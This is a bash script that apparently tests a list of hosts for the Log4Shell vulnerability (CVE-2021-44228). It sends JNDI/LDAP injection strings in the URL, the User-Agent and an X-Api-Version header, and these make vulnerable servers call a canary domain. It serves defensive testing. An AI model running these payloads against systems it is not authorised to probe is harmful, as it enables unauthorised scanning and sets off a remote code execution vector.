#!/bin/bash
# Author: Steve Stonebraker
# Date: 2021-12-10
# Usage: ./log4j_CVE-2021-44228_tester.sh <INPUT_FILE> <CANARY_DOMAIN>
# Purpose:
# This script will iterate through a list of IP Addresses/Domain Names and call
# each one using curl and send a payload that will notify a DNS canary domain
# (if the site is vulnerable to log4shell aka CVE-2021-44228)
INPUTFILE=$1
INPUTFILE_LENGTH=$(wc -l < ${INPUTFILE} | bc)
CANARY_DOMAIN=$2
USERAGENT="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
USERAGENT_PAYLOAD="${USERAGENT} \${jndi:ldap://${CANARY_DOMAIN}/a}"
XAPI_PAYLOAD="X-Api-Version: \${jndi:ldap://${CANARY_DOMAIN}/a}"
URL_PAYLOAD="?x=\$\{jndi:ldap://${CANARY_DOMAIN}/a\}"
echo "" > ./output.txt

COUNT=0
for record in $(cat "${INPUTFILE}")
do
        COUNT=$((COUNT+1))
        echo "[*] Record ${COUNT} of ${INPUTFILE_LENGTH} - [${record}]"
        URL="https://${record}/${URL_PAYLOAD}"
        response=$(curl --silent -L -o /dev/null --connect-timeout 3 --max-time 5.5 -k -w "%{http_code}" -A "${USERAGENT}" "$URL")
        echo "[*] Record ${COUNT} of ${INPUTFILE_LENGTH} - [${record}] - [Response: ${response}] - HTTPS - [Payload: URL]" >> output.txt

        URL="https://${record}"
        response=$(curl --silent -L -o /dev/null --connect-timeout 3 --max-time 5.5 -k -w "%{http_code}" -H "User-Agent: ${USERAGENT_PAYLOAD}" "$URL")
        echo "[*] Record ${COUNT} of ${INPUTFILE_LENGTH} - [${record}] - [Response: ${response}] - HTTPS - [Payload: USER-AGENT]" >> output.txt
        
        URL="https://${record}"
        response=$(curl --silent -L -o /dev/null --connect-timeout 3 --max-time 5.5 -k -w "%{http_code}" -A "${USERAGENT}" -H "${XAPI_PAYLOAD}" "$URL")
        echo "[*] Record ${COUNT} of ${INPUTFILE_LENGTH} - [${record}] - [Response: ${response}] - HTTPS - [Payload: X-API-VERSION]" >> output.txt
done

echo "------------------------------------"
echo "All Domains/IPs have been called"
echo "Log file of HTTP response codes at output.txt"
echo "------------------------------------"
echo "Please note the response codes do not indicate that you are vulnerable"
echo "Your DNS token action will determine if you are vulnerable"
echo "------------------------------------"
